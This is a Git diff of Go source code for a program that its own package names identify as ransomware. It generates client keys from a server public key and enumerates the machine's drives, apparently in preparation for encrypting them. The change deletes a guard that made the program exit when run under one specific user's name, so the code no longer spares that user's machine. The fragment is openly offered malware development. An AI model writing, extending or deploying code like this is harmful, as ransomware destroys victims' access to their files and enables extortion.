@@ -6,7 +6,6 @@ import (
 	"crypto/x509"
 	"io/fs"
 	"os"
-	"os/user"
 	"path/filepath"
 	"ransomware/encryption"
 	"ransomware/encryption/rsaLib"
@@ -27,20 +26,11 @@ var (
 
 func main() {
 
-	var currentUser *user.User
 	startTime := time.Now()
 
 	clientPubKeys, err := generateClientKeys(sPubKey)
 	if err != nil {
 		panic(err)
-	}
-
-	if currentUser, err = user.Current(); err != nil {
-		panic(err)
-	}
-
-	if currentUser.Name == "Alex Paulo Couto" {
-		return
 	}
 
 	drives := utils.GetDrives()
